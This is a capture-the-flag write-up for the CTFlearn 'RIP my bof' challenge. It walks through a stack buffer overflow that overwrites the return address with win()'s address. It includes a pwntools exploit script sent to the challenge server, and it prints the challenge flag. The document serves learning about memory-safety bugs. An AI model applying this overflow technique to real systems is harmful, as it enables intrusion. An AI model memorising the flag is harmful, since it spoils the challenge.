# RIP my bof

## [CTFlearn Challenge](https://ctflearn.com/challenge/1011)
<img src="rip my bof - solved.png">

## Solutions
### Step 1:
After downloading the tar folder, I unzipped it using ```tar -xf```. The extracted folder was named ```pwn-simple-rip```. Then
the server was connected via command ```nc thekidofarcrania.com 4902```. 

<img src="rip my bof - 1.png">

### Step 2: 
Similar to simple bof, this question tests understanding on buffer overflows. 

```
void win() {
  system("/bin/cat /flag.txt");
}
```

In this case, we want to have access to ```win()``` in order to get the flag. To do so, we need to overflow the buffer so that the return address can be overwritten to ```win()```. 

### Step 3: 
From the memory representation, I knew that the ```return address``` points at ```0x0804868b``` (red) so this indicates that I had to overflow exactly 60 bytes. 

<img src="rip my bof - 5.png">

### Step 4: 
After I have overflowed the buffer, I need to overwrite the data in the ```return address``` to the address of ```win()```. 

I used ```objdump``` to obtain the address of the function. This command displays information from object files in the machine. Using ```-d``` option, I would be able to get the assembler contents (eg. memory address) of the executable sections (such as ```win()``` in this case) in object files. 

<img src="rip my bof - 2.png">

```win() address: 08048586 ```

### Step 5: 
Since the address is in little-edian encoding (least significant byte is stored at the largest memory address - first), we have to reverse it, becoming ```86850408```. 

### Step 6: 
Given the memory address (in bytes), it is easier to write a python script to send the input string (in bytes overall) to the server, rather than entering input in the command. 

```
from pwn import *


s = b"\x5f" * 60 + b"\x86\x85\x04\x08"

p = remote("thekidofarcrania.com", 4902)
p.recv()
p.sendline(s)
p.interactive()
```

Here, I imported ```pwn``` libary, which is one of the exploit development packages available in python, to send the string to the server.

### Step 7: 
Running the python script gave me the flag!

<img src="rip my bof - 3.png">
<img src="rip my bof - 4.png">

### Flag: 
```CTflearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}```